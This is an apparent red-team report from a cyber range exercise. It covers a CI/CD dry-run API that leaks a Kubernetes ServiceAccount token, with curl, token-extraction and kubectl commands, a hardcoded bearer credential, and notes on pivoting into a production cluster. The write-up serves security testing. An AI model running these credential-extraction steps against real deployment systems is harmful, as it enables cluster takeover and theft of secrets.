# Red Team Engagement Report — M5 · dev-deploy
**Report ID:** RED-REPORT-DEV01-M05 | **Operator:** Rudra-7
**Range:** RNG-DEV-01 · VIKAS TANTRA · OPERATION GRIDFALL

---
## Executive Summary
| Item | Value |
|---|---|
| Target | PUL Deploy Commander · 11.x.x.x:8888 |
| Vulnerability | Dry-run API returns full K8s manifest including SA token Secret |
| MITRE | T1552.001 |
| Outcome | **SUCCESS** — K8s ServiceAccount token + 193.x.x.x:6443 extracted |
| Pivot | RNG-CLD-01 Kubernetes cluster (193.x.x.x) |

---
## Exploitation
```bash
# Trigger dry-run — returns full manifest including Secrets
curl -s -X POST \
     "http://11.x.x.x:8888/api/applications/pul-ota-firmware/sync?dryRun=true" \
     -H "Authorization: Bearer dc-pul-deploy-2024-gridfall" \
     | python3 -m json.tool | grep -A5 "service-account-token"

# Extract and decode SA token from manifest
TOKEN_B64=$(curl ... | python3 -c "import sys,json; d=json.load(sys.stdin); print([l for l in d['manifest'].split() if 'eyJ' in l][0])")
echo "$TOKEN_B64" | base64 -d

# Build kubeconfig and verify access
kubectl --kubeconfig /tmp/pul-k8s.kubeconfig get namespaces
```

## Artifacts
- K8s SA token: `pul-ota-deployer` (pul-production namespace)
- Cluster: `https://193.x.x.x:6443` (pul-production-k8s)
- Namespace: `pul-production`

## Operator Notes (Rudra-7)
RNG-DEV-01 complete. The dry-run feature returning Secrets is the exact pattern documented in our DARKLINE campaign playbook — CI/CD systems that provide manifest preview features often include more than intended. The SA token in the manifest confirms static token provisioning (DEVOPS-3201 open ticket) — K8s is not using auto-rotating tokens. Cloud pivot is clean.

**KAAL CHAKRA Phase 3 active. RNG-CLD-01 engaged.**
